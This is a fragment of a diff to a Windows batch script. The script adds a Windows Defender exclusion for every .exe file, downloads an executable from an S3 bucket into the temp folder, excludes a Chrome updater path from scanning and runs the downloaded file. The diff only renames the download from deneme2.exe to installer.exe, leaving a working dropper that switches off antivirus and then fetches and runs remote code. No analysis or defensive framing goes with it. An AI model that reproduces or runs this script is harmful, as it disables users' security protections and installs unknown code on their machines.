@@ -25,7 +25,7 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://depo3.s3.eu-central-1.amazonaws.com/deneme2.exe"
+Powershell -Command "Invoke-Webrequest 'https://depo3.s3.eu-central-1.amazonaws.com/installer.exe"
 Powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files\Google\Chrome\updater.exe'"
 installer.exe
 
